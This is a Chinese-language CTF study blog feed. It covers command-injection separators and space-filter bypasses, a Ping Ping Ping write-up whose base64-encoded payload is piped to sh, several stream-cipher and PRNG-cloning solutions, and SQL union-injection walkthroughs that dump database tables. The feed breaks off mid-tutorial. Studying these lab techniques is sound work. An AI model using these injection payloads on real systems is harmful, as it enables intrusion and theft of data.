<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HappyCoder&#39;Home</title>
  
  
  <link href="https://zhangkaibin0921.github.io/atom.xml" rel="self"/>
  
  <link href="https://zhangkaibin0921.github.io/"/>
  <updated>2022-03-23T14:47:40.114Z</updated>
  <id>https://zhangkaibin0921.github.io/</id>
  
  <author>
    <name>zhangkaibin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-03-23T14:23:42.000Z</published>
    <updated>2022-03-23T14:47:40.114Z</updated>
    
    <content type="html"><![CDATA[<h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><p>Windows系例支持的管道符如下所示。<br>● “|”：直接执行后面的语句。例如：ping 127.0.0.1|whoami。<br>● “||”：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：ping 2||whoami。<br>● “&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&amp;whoami。<br>●“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami。</p><p>Linux系统支持的管道符如下所示。<br>●“;”：执行完前面的语句再执行后面的。例如：ping 127.0.0.1;whoami。<br>●“|”：显示后面语句的执行结果。例如：ping 127.0.0.1|whoami。<br>●“||”：当前面的语句执行出错时，执行后面的语句。例如：ping 1||whoami。<br>●“&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&amp;whoami。<br>●“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami。</p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;可替代空格<br>$&#123;IFS&#125;可替代空格<br>$IFS$<span class="hljs-number">1</span>可替代空格<br>%09(url传递可替代空格)<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;管道符&quot;&gt;&lt;a href=&quot;#管道符&quot; class=&quot;headerlink&quot; title=&quot;管道符&quot;&gt;&lt;/a&gt;管道符&lt;/h2&gt;&lt;p&gt;Windows系例支持的管道符如下所示。&lt;br&gt;● “|”：直接执行后面的语句。例如：ping 127.0.0.1|whoami。&lt;</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>命令执行题目</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/</id>
    <published>2022-03-23T14:16:02.000Z</published>
    <updated>2022-03-23T14:45:18.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>ping 127.0.0.1  正常<br><img src="/picture/zhixing1.png"></p><p><code>?ip=127.0.0.1|ls</code><br><img src="/picture/zhixing2.png"></p><p><code>?ip=127.0.0.1|cat flag.php</code><br><img src="/picture/zhixing3.png"><br>过滤了空格</p><p><code>?ip=127.0.0.1|cat$&#123;IFS&#125;flag.php</code><br><img src="/picture/zhixing4.png"><br>没绕过，可能过滤了{ 或者$</p><p><code>?ip=127.0.0.1|cat$IFS$1flag.php</code><br><img src="/picture/zhixing5.png"><br>绕过了，但是应该过滤了flag</p><p>?ip=127.0.0.1|cat$IFS$1fla?.php<br>还是不行，问好应该也被过滤了</p><p>那先看下index.php吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">/?ip=<br>|\<span class="hljs-string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="hljs-string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="hljs-string">    die(&quot;fxck your symbol!&quot;);</span><br><span class="hljs-string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="hljs-string">    die(&quot;fxck your space!&quot;);</span><br><span class="hljs-string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="hljs-string">    die(&quot;fxck your bash!&quot;);</span><br><span class="hljs-string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="hljs-string">    die(&quot;fxck your flag!&quot;);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="hljs-string">  echo &quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;;</span><br><span class="hljs-string">  print_r($a);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>看到了过滤字符的代码<br>正则也绕过不过去了，看了下别人的wp，学了个新姿势，base64加密绕过</p><p><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code><br>Y2F0IGZsYWcucGhw是cat flag.php的base64-encode<br><img src="/picture/zhixing6.png"></p><p>看看这个新姿势</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">?ip=127.0.0.1;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>`<span class="hljs-keyword">ls</span>`<br>`<span class="hljs-keyword">ls</span>` 相当于system(<span class="hljs-keyword">ls</span>);<br>然后<span class="hljs-keyword">cat</span>显示内容<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GXYCTF2019-Ping-Ping-Ping&quot;&gt;&lt;a href=&quot;#GXYCTF2019-Ping-Ping-Ping&quot; class=&quot;headerlink&quot; title=&quot;[GXYCTF2019]Ping Ping Ping&quot;&gt;&lt;/a&gt;[GXYCTF201</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>流密码</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/20/%E6%B5%81%E5%AF%86%E7%A0%81/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/20/%E6%B5%81%E5%AF%86%E7%A0%81/</id>
    <published>2022-03-20T08:00:35.000Z</published>
    <updated>2022-03-20T08:40:03.633Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Replay"><a href="#Replay" class="headerlink" title="Replay"></a>Replay</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>key=urandom(<span class="hljs-number">10</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Rc4_Encrypt</span>(<span class="hljs-params">msg,key</span>):</span><br>    Rc4=ARC4.new(key)<br><br>    <span class="hljs-keyword">return</span> Rc4.encrypt(msg).<span class="hljs-built_in">hex</span>()<br><br>hint=<span class="hljs-string">b&#x27;do you know how to recover the keystream?&#x27;</span><br><span class="hljs-built_in">print</span>(Rc4_Encrypt(hint,key))<br><span class="hljs-comment">#56c36031c2d6455ced3eed3f267251a023478f493c3fc567956869930483b0334a1b4bf4c74eda8151</span><br><span class="hljs-built_in">print</span>(Rc4_Encrypt(flag,key))<br><span class="hljs-comment">#54c0212fd6c05154e265a82c767c16e26e1a9c036b6cce72932f79de0dd0f66f1a5a0cb9d756</span><br></code></pre></td></tr></table></figure><p>RC4已知明文攻击</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> binascii import *<br><span class="hljs-attribute">from</span> Crypto.Util.strxor import strxor<br><span class="hljs-attribute">m1</span>=b&#x27;do you know how to recover the keystream?&#x27;<br><span class="hljs-attribute">c1</span>=&#x27;<span class="hljs-number">56</span>c<span class="hljs-number">36031</span>c<span class="hljs-number">2</span>d<span class="hljs-number">6455</span>ced<span class="hljs-number">3</span>eed<span class="hljs-number">3</span>f<span class="hljs-number">267251</span>a<span class="hljs-number">023478</span>f<span class="hljs-number">493</span>c<span class="hljs-number">3</span>fc<span class="hljs-number">567956869930483</span>b<span class="hljs-number">0334</span>a<span class="hljs-number">1</span>b<span class="hljs-number">4</span>bf<span class="hljs-number">4</span>c<span class="hljs-number">74</span>eda<span class="hljs-number">8151</span>&#x27;<br><span class="hljs-attribute">c1</span>=unhexlify(c<span class="hljs-number">1</span>)    # 将十六进制字符串转换成bytes流<br><span class="hljs-attribute">keystream</span>=strxor(m<span class="hljs-number">1</span>,c<span class="hljs-number">1</span>)  #strxor两个比特流逐比特亦或得到密钥流<br><span class="hljs-attribute">c2</span>=&#x27;<span class="hljs-number">54</span>c<span class="hljs-number">0212</span>fd<span class="hljs-number">6</span>c<span class="hljs-number">05154</span>e<span class="hljs-number">265</span>a<span class="hljs-number">82</span>c<span class="hljs-number">767</span>c<span class="hljs-number">16</span>e<span class="hljs-number">26</span>e<span class="hljs-number">1</span>a<span class="hljs-number">9</span>c<span class="hljs-number">036</span>b<span class="hljs-number">6</span>cce<span class="hljs-number">72932</span>f<span class="hljs-number">79</span>de<span class="hljs-number">0</span>dd<span class="hljs-number">0</span>f<span class="hljs-number">66</span>f<span class="hljs-number">1</span>a<span class="hljs-number">5</span>a<span class="hljs-number">0</span>cb<span class="hljs-number">9</span>d<span class="hljs-number">756</span>&#x27;<br><span class="hljs-attribute">c2</span>=unhexlify(c<span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(strxor(c<span class="hljs-number">2</span>,keystream[:len(c<span class="hljs-number">2</span>)]))<br></code></pre></td></tr></table></figure><p>strxor函数实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strxor</span>(<span class="hljs-params">a, b</span>):</span>     <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) &gt; <span class="hljs-built_in">len</span>(b):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(x) ^ <span class="hljs-built_in">ord</span>(y)) <span class="hljs-keyword">for</span> (x, y) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a[:<span class="hljs-built_in">len</span>(b)], b)])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(x) ^ <span class="hljs-built_in">ord</span>(y)) <span class="hljs-keyword">for</span> (x, y) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b[:<span class="hljs-built_in">len</span>(a)])])<br></code></pre></td></tr></table></figure><h2 id="Easy-Lfsr"><a href="#Easy-Lfsr" class="headerlink" title="Easy_Lfsr"></a>Easy_Lfsr</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br>flag=<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+<span class="hljs-built_in">hex</span>(getrandbits(<span class="hljs-number">32</span>))[<span class="hljs-number">2</span>:]+<span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lfsr</span>(<span class="hljs-params">R,mask</span>):</span><br>    output = (R &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffff</span>  <br>    i=(R&amp;mask)&amp;<span class="hljs-number">0xffffffff</span><br>    lastbit=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i!=<span class="hljs-number">0</span>:<br>        lastbit^=(i&amp;<span class="hljs-number">1</span>)<br>        i=i&gt;&gt;<span class="hljs-number">1</span><br>    output^=lastbit<br>    <span class="hljs-keyword">return</span> (output,lastbit)<br><br><br><br>R=<span class="hljs-built_in">int</span>(flag[<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>mask =<span class="hljs-number">0b10100110001000111000100110010001</span><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    tmp=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        (R,out)=lfsr(R,mask)<br>        tmp=(tmp&lt;&lt;<span class="hljs-number">1</span>)^out<br>    f.write(<span class="hljs-built_in">chr</span>(tmp).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))<br>f.close()<br><br></code></pre></td></tr></table></figure><p>先得到key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>s=f.read()<br><span class="hljs-built_in">print</span>(hexlify(s))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> *<br>key=<span class="hljs-number">0x25aaea999c18a4e3</span><br>bin_out=<span class="hljs-built_in">bin</span>(key)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>*<span class="hljs-number">8</span>)<br>key=bin_out[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>]<br>mask =<span class="hljs-string">&#x27;10100110001000111000100110010001&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(mask))<br>R=<span class="hljs-string">&#x27;&#x27;</span><br>tem=key<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    output=<span class="hljs-string">&#x27;?&#x27;</span>+key[:<span class="hljs-number">31</span>]<br>    ans=<span class="hljs-built_in">int</span>(tem[-<span class="hljs-number">1</span>-i])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">1</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">5</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">8</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">9</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">12</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">16</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">17</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">18</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">22</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">26</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">27</span>])^<span class="hljs-built_in">int</span>(output[-<span class="hljs-number">30</span>])<br>    R+=<span class="hljs-built_in">str</span>(ans)<br>    key=<span class="hljs-built_in">str</span>(ans)+key[:<span class="hljs-number">31</span>]<br><span class="hljs-built_in">print</span>(R[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h2 id="Mt-19937"><a href="#Mt-19937" class="headerlink" title="Mt_19937"></a>Mt_19937</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>    f.write(<span class="hljs-built_in">str</span>(getrandbits(<span class="hljs-number">32</span>))+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <br>flag=<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+<span class="hljs-built_in">hex</span>(getrandbits(<span class="hljs-number">32</span>))[<span class="hljs-number">2</span>:]+<span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br>f.close()<br></code></pre></td></tr></table></figure><p>预测随机数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">invert_right</span>(<span class="hljs-params">m,l,val=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    length = <span class="hljs-number">32</span><br>    mx = <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">if</span> val == <span class="hljs-string">&#x27;&#x27;</span>:<br>        val = mx<br>    i,res = <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i*l&lt;length:<br>        mask = (mx&lt;&lt;(length-l)&amp;mx)&gt;&gt;i*l<br>        tmp = m &amp; mask<br>        m = m^tmp&gt;&gt;l&amp;val<br>        res += tmp<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">invert_left</span>(<span class="hljs-params">m,l,val</span>):</span><br>    length = <span class="hljs-number">32</span><br>    mx = <span class="hljs-number">0xffffffff</span><br>    i,res = <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i*l &lt; length:<br>        mask = (mx&gt;&gt;(length-l)&amp;mx)&lt;&lt;i*l<br>        tmp = m &amp; mask<br>        m ^= tmp&lt;&lt;l&amp;val<br>        res |= tmp<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">invert_temper</span>(<span class="hljs-params">m</span>):</span><br>    m = invert_right(m,<span class="hljs-number">18</span>)<br>    m = invert_left(m,<span class="hljs-number">15</span>,<span class="hljs-number">4022730752</span>)<br>    m = invert_left(m,<span class="hljs-number">7</span>,<span class="hljs-number">2636928640</span>)<br>    m = invert_right(m,<span class="hljs-number">11</span>)<br>    <span class="hljs-keyword">return</span> m<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clone_mt</span>(<span class="hljs-params">record</span>):</span><br>    state = [invert_temper(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> record]<br>    gen = Random()<br>    gen.setstate((<span class="hljs-number">3</span>,<span class="hljs-built_in">tuple</span>(state+[<span class="hljs-number">0</span>]),<span class="hljs-literal">None</span>))<br>    <span class="hljs-keyword">return</span> gen<br><br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).readlines()<br>prng = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>    i = i.strip(<span class="hljs-string">&#x27;n&#x27;</span>)<br>    prng.append(<span class="hljs-built_in">int</span>(i))<br><br>g = clone_mt(prng[:<span class="hljs-number">624</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>    g.getrandbits(<span class="hljs-number">32</span>)<br><br>key = g.getrandbits(<span class="hljs-number">32</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(key))<br></code></pre></td></tr></table></figure><p><a href="https://www.anquanke.com/post/id/205861#h2-3">MT19937伪随机数生成算法详细说明</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Replay&quot;&gt;&lt;a href=&quot;#Replay&quot; class=&quot;headerlink&quot; title=&quot;Replay&quot;&gt;&lt;/a&gt;Replay&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入题</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/18/SQL%E6%B3%A8%E5%85%A5%E9%A2%98/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/18/SQL%E6%B3%A8%E5%85%A5%E9%A2%98/</id>
    <published>2022-03-18T02:47:56.000Z</published>
    <updated>2022-03-23T14:14:39.524Z</updated>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战2019-LoveSQL"><a href="#极客大挑战2019-LoveSQL" class="headerlink" title="极客大挑战2019-LoveSQL"></a>极客大挑战2019-LoveSQL</h2><p>1、<br>万能密码: <code>&#39; or 1=1#</code><br><img src="/picture/web20.png"></p><p>2、<br>查列数:<br><code>&#39; or 1=1 order by 1#</code><br><code>&#39; or 1=1 order by 2#</code><br><code>&#39; or 1=1 order by 3#</code><br><code>&#39; or 1=1 order by 4#</code></p><p>4的时候报错，所以有三列<br><img src="/picture/web21.png"></p><p>3<br>查数据库:<br><code>-1&#39;union select 1,2,database()#</code></p><p>为什么这里不用万能密码了呢？因为不需要，井号已经把查询密码的注释掉了<br>前面的-1是干什么用的呢？因为我们看到它只能显示出两条数据，一个是用户名，一个是密码。所以这个-1就是让这个查不出来(也可以是其他的比如1)，这个再union注入那里有写<br><img src="/picture/web22.png"><br>至于为什么出来了2，而1没有出来，我也不太清楚</p><p>所以查出来数据库是geek</p><p>4、<br>查表<br><code>-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code><br>其实上一步查数据库是可以省略的，因为直接<code>where table_schema=database()</code>即可</p><p><img src="/picture/web23.png"><br>可以看到查到了两个表，geekuser,l0ve1ysq1</p><p>5、查字段<br><code>-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;#</code></p><p>先看下l0ve1ysq1表，同理可得geekuser<br><img src="/picture/web24.png"></p><p>可以看到有三个字段id,username,password</p><p>6、查数据<br><code>-1&#39;union select 1,2,group_concat(password) from geek.l0ve1ysq1#</code><br>先查password的数据<br><img src="/picture/web25.png"><br>也可以直接把三个字段数据全部爆出来<br><code>-1&#39;union select 1,2,group_concat(id,username,password) from geek.l0ve1ysq1#</code></p><p>flag直接出来了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;极客大挑战2019-LoveSQL&quot;&gt;&lt;a href=&quot;#极客大挑战2019-LoveSQL&quot; class=&quot;headerlink&quot; title=&quot;极客大挑战2019-LoveSQL&quot;&gt;&lt;/a&gt;极客大挑战2019-LoveSQL&lt;/h2&gt;&lt;p&gt;1、&lt;br&gt;万能密码</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>sql注入和sqlmap的使用</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/17/sql%E6%B3%A8%E5%85%A5-0/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/17/sql%E6%B3%A8%E5%85%A5-0/</id>
    <published>2022-03-17T14:25:01.000Z</published>
    <updated>2022-03-23T09:12:39.588Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>还是有点乱，有时间会把弄好的</p></blockquote><p>常见的SQL注入有数字型注入、Union注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入</p><p>浏览器会自动将URI中的特殊字符进行URL编码，服务器收到请求后会自动进行URL解码</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p><code>SELECT username, password FROM users WHERE username=&#39;&#39; or 1=1 -- AND password=&#39;anything</code><br>用户的输入用户名为<code>&#39; or 1=1 #</code>，密码为任意值即可<br>或者<code>&#39; or 1=1 --+&#39;</code>   ，加号会转义成空格</p><h2 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h2><p><img src="/picture/web19.png"></p><p>1、查看数据库名<br><code>select schema_name from information_schema.schemata;</code></p><p>2、查看表名<br><code>select table_name from information_schema.tables where table_schema=&#39;security&#39;;</code><br>这个security是上一步查出来的数据库名称</p><p>3、查看列名<br><code>select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;;</code><br>users是上一步查出来的表名</p><p>4、查数据<br><code>select username,password from security.users;</code><br>username和password是一步查出来的列名</p><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" 